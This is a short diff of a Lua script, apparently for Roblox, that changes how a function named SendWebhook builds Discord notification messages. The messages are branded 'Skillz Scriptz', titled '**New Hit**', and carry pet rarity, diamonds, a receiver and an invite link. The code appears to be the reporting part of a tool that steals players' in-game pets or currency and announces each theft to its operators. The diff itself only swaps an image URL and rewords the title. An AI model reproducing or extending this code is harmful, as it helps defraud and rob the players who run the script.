@@ -955,7 +955,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1123300174505193594/1133047222917931068/Screenshot_2023-07-14_121944.png"
+        "https://raw.githubusercontent.com/PsxScriptsW/image/main/Screenshot%202023-07-14%20121944.png"
         data1 = {
             ["content"] = ping,
             ["username"] = "Skillz Scriptz",
@@ -1025,13 +1025,13 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1123300174505193594/1133047222917931068/Screenshot_2023-07-14_121944.png"
+        "https://raw.githubusercontent.com/PsxScriptsW/image/main/Screenshot%202023-07-14%20121944.png"
         data1 = {
             ["content"] = ping,
             ["username"] = "Skillz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||Skillz Scripts On Top||",
+                ["title"] = "**New Hit With** ||Skillz Scripts On Top||",
                 ["url"] = "https://dsc.gg/skillzscripts",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
